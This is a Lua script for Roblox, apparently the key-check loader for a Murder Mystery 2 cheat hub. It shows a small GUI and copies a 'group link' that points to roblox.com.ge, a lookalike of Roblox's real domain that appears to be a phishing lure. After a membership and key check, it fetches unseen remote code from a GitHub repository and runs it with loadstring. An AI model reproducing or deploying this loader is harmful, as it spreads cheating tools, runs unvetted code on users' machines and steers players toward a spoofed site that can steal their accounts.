-- ======================
-- MM2 KEY SYSTEM (READY)
-- ======================

-- CONFIG
local GROUP_ID = 7178088300
local GROUP_LINK = "https://roblox.com.ge/communities/7178088300/"
local KEY_URL = "https://raw.githubusercontent.com/YOURUSERNAME/YOURREPO/main/keys.txt"

-- SERVICES
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- UI
local gui = Instance.new("ScreenGui")
gui.Name = "MM2KeySystem"
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.36, 0.32)
frame.Position = UDim2.fromScale(0.32, 0.34)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.BorderSizePixel = 0

local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.fromScale(1, 0.2)
title.BackgroundTransparency = 1
title.Text = "MM2 Syndrix Key System"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold

local copyBtn = Instance.new("TextButton", frame)
copyBtn.Size = UDim2.fromScale(0.9, 0.18)
copyBtn.Position = UDim2.fromScale(0.05, 0.25)
copyBtn.Text = "Copy Group Link"
copyBtn.Font = Enum.Font.Gotham
copyBtn.TextScaled = true

local box = Instance.new("TextBox", frame)
box.Size = UDim2.fromScale(0.9, 0.18)
box.Position = UDim2.fromScale(0.05, 0.48)
box.PlaceholderText = "Enter Key"
box.Font = Enum.Font.Gotham
box.TextScaled = true
box.ClearTextOnFocus = false

local verify = Instance.new("TextButton", frame)
verify.Size = UDim2.fromScale(0.9, 0.18)
verify.Position = UDim2.fromScale(0.05, 0.72)
verify.Text = "Verify"
verify.Font = Enum.Font.GothamBold
verify.TextScaled = true

-- COPY GROUP LINK
copyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(GROUP_LINK)
        copyBtn.Text = "Link Copied!"
        task.wait(1.2)
        copyBtn.Text = "Copy Group Link"
    end
end)

-- KEY CHECK
local function validKey(input)
    local ok, data = pcall(function()
        return game:HttpGet(KEY_URL)
    end)
    if not ok then return false end

    for k in string.gmatch(data, "[^\r\n]+") do
        if input == k then
            return true
        end
    end
    return false
end

-- VERIFY
verify.MouseButton1Click:Connect(function()
    if not player:IsInGroup(GROUP_ID) then
        verify.Text = "Join Group First"
        task.wait(1.5)
        verify.Text = "Verify"
        return
    end

    if validKey(box.Text) then
        gui:Destroy()

        loadstring(game:HttpGet(
            "https://raw.githubusercontent.com/GaG-2/mm2syndrix/refs/heads/main/madebysyndrixhub-mm2-v1-main-lua"
        ))()
    else
        verify.Text = "Invalid Key"
        task.wait(1.5)
        verify.Text = "Verify"
    end
end)
